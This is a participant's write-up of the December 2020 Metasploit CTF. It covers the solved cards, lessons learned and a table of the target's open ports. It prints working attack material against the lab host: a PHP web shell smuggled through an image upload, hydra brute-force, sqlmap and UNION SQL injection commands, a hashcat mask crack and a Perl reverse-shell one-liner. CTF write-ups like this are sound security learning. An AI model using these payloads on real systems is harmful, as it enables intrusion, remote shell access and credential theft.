<p align="center"> ### MetasploitCTF, December 2020 documentation ### </p>
<p align="center"> ### Placement: 110/413 ### </p>

# Solved flags:
### 4 of Hearts (80)
After finding all the open ports, the first and simplest thing to do is `curl 172.15.100.101` where we discover the line `<img src=”4_of_hearts.png” />`.

`curl 172.15.100.101/4_of_hearts.png -o 4_of_hearts.png` to fetch the file. Then we get the md5hash with `md5sum 4_of_hearts.png`

### Red Joker (9007)
This site is a simple directory containing a file called `red_joker.zip`. Unzipping this file yields the Red Joker card, and 7 seemingly irrelevant, empty pdf files. The pdf files are all 755 bytes and seem to contain basic pdf metadata.

### 6 of Diamonds (8200)
The site hosts a simple gallery of moose pictures but also allows anyone to upload their own pictures. We will create a file with the extension .jpg.php and inside that file we will put a php payload`<?php passthru($_GET["cmd"]); ?>`. This will allow us to pass commands and do directory traversal in the URL. We will then upload this file to the server... Somehow.

This really shouldn't work, and trying to reproduce this results in a faulty mime type error. What we're actually supposed to do is have a valid jpeg mime type `\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01` on the first line, so the check would be properly passed.

So...

`http://172.15.100.101:8200/images/shell.jpg.php?cmd=cd%20../%20;%20ls`

to list everything in the directory above /images. In that directory, there is another directory called 
`157a7640-0fa4-11eb-adc1-0242ac120002`.

Inside of this directory we can find our flag, `6_of_diamonds.png`. To get the image, we will simply do:

`curl 172.15.100.101:8200/157a7640-0fa4-11eb-adc1-0242ac120002/6_of_diamonds.png -o 6_of_diamonds.png`

### 6 of Hearts (6868)
This site hosts another gallery. There are subdirectories `/files` and `/notes` and the initials of the artists from the main page can be used to access their files and notes, like `/files/BD/0` etc. There's definitely no need to write a python script to create a wordlist for every 3 and 2 letter combination and then scrape the site with dirb. Just use your brain and the initials from the front page.

Anyways... `/notes/BD/1` tells us that the site admin is called Beth. and `/MC/2` tells us that Beth's a weirdo and her middle name is Ulysses Denise Donnoly. Checking `/notes/BUDD/0` yields nothing, so we're still missing the last name initial. Randomly trying Y works. `/notes/BUDDY/0` displays a unicode character of 6 of hearts, `/1` is a lennyface and `/2` says 'Close, but no cigar'.

It is at this point where we might be reminded that there is a files directory. Or we might forget about that for a while. As it turns out, `/files/BUDDY/2` is our file, 6 of Hearts.

### 8 of Hearts (4545)
This is another simple directory with two C files, 8_of_hearts.elf and 8_of_hearts.enc. We download both of them. The .enc is an encoded file and the .elf decodes it. We chmod 700 the elf file and run it. 

It takes an input, when not given any it complains, "You did not say buffalo!" When we input buffalo, the program is still dissatisfied, "MOAR buffalo!" it exclaims. It turns out that any sane amount of buffalo is not enough. Creating a text file with a thousand buffalos in it and piping it to the .elf file seems to do the trick though. `cat buffalo.txt | ./8_of_hearts.elf` creates the png, 8 of Hearts.

### 3 of Spades (8080)
The site has a login form and an answer submission form. We are given a hint: `guest is a valid username, but can you determine what the other valid username for this system is? Use your observational skills!` After a long time of attempting to use observational skills, we resort to brute forcing the answer with hydra: 

`hydra -L /usr/share/wordlists/wfuzz/general/common.txt -p "" -s 8080 172.15.100.101 http-post-form "/answer.php:answer=^USER^&Login:Sorry, that was not the right answer!" -V`

The answer turns out to be `demo`. Submitting this reveals the 3 of spades card. Unsure how the hint "Use your observational skills" should work here.

### 2 of Spades (9001)
This is a game reviews site. When we input something that the lookup chokes on, such as `"' OR 1=1"` we get sent to an error page. Here we learn many things. The backend is ruby, it's running a SQLite database, and one of the directories is called 2_of_spades. So, we're gonna explore it with sqlmap.

`sqlmap "172.15.100.101:9001" --data="search=test"` will check if the parameter "search" is susceptible to a SQL injection. As it turns out, it is. 

Now we can do `sqlmap "172.15.100.101:9001 --data="search=test" --tables`, to find all the tables in this database. After very slowly discovering some boring ones, we stumble upon a table called "hidden". 

We can dump the contents of the table with `sqlmap "172.15.100.101:9001" --data="search=test" -T hidden --dump`. This takes another hour to complete, and in the dump we have the link to our flag, 2 of Spades. Easy enough, with the right tool.

### Black Joker (8123)
We are brought to a page that strongly advocates salt free hashing. There are a couple of easy hints to find. Clicking on the “hash brown fried in coconut oil” picture takes us to a sign up page. Here we learn that passwords on the site are `a-z, 0-9`. Experimenting with the password validation we can also learn that passwords are 9-14 chars long.

Clicking on the other picture, depicting a hash brown fried in vegetable oil, we get taken to a hint page. When using the email we found on the front page, "admin@example.com", a hint is displayed! `The password begins with "ihatesalt"`

Here it gets a little tougher, there are no more obvious hints. Inspecting the network traffic in the browser yields no new information. There could be things we are missing though, so we will take a closer look with burp.

Generating traffic while examining it with burp turns out to be a great idea, as it reveals the hash for the password: `7f35f82c933186704020768fd08c2f69` This should be pretty easy to crack using hashcat. We use the following arguments:

`hashcat -a 3 -m0 7f35f82c933186704020768fd08c2f69 -1 ?l?d ihatesalt?1?1?1?1?1`, where

`-a 3` refers to bruteforce method, `-m0` refers to md5 as it's 32 chars, `-1` defines a 'mask' that uses `?l` and `?d`, which refer to `a-z` and `0-9` respectively. Then we fill the remaining possible chars with `?1?1?1...`

This cracks the remainder of the password (ihatesaltalot7) in about half a minute. Using that to log in reveals our card, The Black Joker.

# In hindsight...
Missed a UDP port entirely. Big yikes. Should have scanned for UDP ports, `sudo nmap -sU -v 172.15.33.149 --top-ports 20`

### 9001
Would have been a lot quicker using a UNION attack. Single quote to pass a payload `overwatch' union select 1,sql,3 FROM sqlite_master;-- -`

### 9010
Hosts QOH Client.jar, downloading and running `java -jar QOH_Client.jar 172.15.100.101 9008` gives simple interface, requires auth. Solution was to decompile the jar and slightly modify it to trick the server, as the auth was all client side.

### 9008
Connecting with telnet prints two U+2592 characters. Considering that this is the port that 9010 jar file connects to, you would think that either 2592 or 5184 is somehow related to that. It turned out to be much more complicated.

### 8080
The `Use your observational skills` hint was referring to the fact that when using a valid username, there was a 5 second load time, whereas when using an invalid password the load time was almost instantaneous. This could be used to write a small python script to crack the password, but hydra was simpler in my opinion.

### 4545
Could have just edited the .elf file to not ask for all the buffalos, using Ghidra, a reverse engineering tool developed by the NSA... Not that big brain yet.

### 1337
Vulnerable to a format strings attack where you pass `%x`, `%s`. `%d` etc with the aim of getting a memory dump. Honestly goes over my head mostly. But we got pretty close.

### 1080
used socks5 and proxychains. `socks5  172.15.18.101 1080` into `/etc/proxychains.conf` , then look at open ports `proxychains nmap -sT --top-ports=100 127.0.0.1`. Flag on port 8000

### 9000
input was apparently used to construct a shell command. Reverse shell using

`$(perl -e 'use Socket;$i="172.15.18.100";$p=9000;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};')`

Actually really cool.

### 5555
Script to play the telnet game. Absolute madman https://gist.github.com/busterb/2fcd6f95acc89c0b85ef2d08b89930ae

### 8092
this is what I get for finding PHP unbelievably dull

## Write-ups
https://sec.stealthcopter.com/tag/ctf/

https://www.youtube.com/watch?v=kEXocIA0BQU

https://rushisec.net/metasploit-ctf-2020-writeup/

https://blog.ikuamike.io/posts/2020/metasploitctf2020/

# Other stuff

## Open ports on Attack box (172.15.100.101)

acquired with nmap `sudo nmap -sS -sV 172.15.100.101` or `-p-` for additional ports, but less information.

Port | Protocol | Notes | Card / Solved
--- | --- | --- | --- |
80 | http | 172.15.100.101/4_of_hearts.png | 4 of Hearts / SOLVED
1080 | socks | allows 1 newline, then closes conn? |
1337 | telnet | 9 of clubs service | 9 of Clubs
4545 | http/dir | directory with 2 files | 8 of Hearts / SOLVED 
5555 | telnet | impossible game | 
6868 | http | some photos, no obvious hints | 6 of Hearts / SOLVED
8080 | http | login page, no obvious hints | 3 of Spades / SOLVED
8092 | http | Apache, login page with PHP code hint | 
8101 | http | EXTREMELY DIFFICULT | 5 of Clubs
8123 | http | Salt Free Hashes, 2 links, fail to load | Black Joker / SOLVED
8200 | http | Gallery | 6 of Diamonds / SOLVED 
8201 | ? | intranet.metasploit.ctf:8201/, doesn't load | 
8202 | http | sign in page, no obvious hints | 
8888 | http | lists all metasploit modules | 
9000 | http | WEBrick httpd 1.6.0 (Ruby 2.7.0), Game Library | 
9001 | http | Thin httpd, Game reviews | 2 of Spades / SOLVED
9007 | http | red_joker.zip | Red Joker / SOLVED 
9008 | telnet | weird ass characters |
9009 | ssh | openssh, Ubuntu. admin/password | Ace of Clubs
9010 | http | Apache, hosting QOH Client.jar | Queen of Hearts

## Get sites to load locally
Set up a proxy in firefox: `Settings > Options > Network Settings`

Set manual proxy configuration. `SOCKS Host 127.0.0.1, Port 7890`

Then open a putty connection to Kali box in cmd using the same port

`putty -load *stored_session_name* -D 7890`

## Useful stuff
https://security.stackexchange.com/questions/201931/hashcat-specify-number-of-characters

https://www.binarytides.com/sqlmap-hacking-tutorial/

https://www.hackingarticles.in/comprehensive-guide-on-hydra-a-brute-forcing-tool/

https://www.linuxbabe.com/desktop-linux/how-to-use-proxychains-to-redirect-your-traffic-through-proxy-server
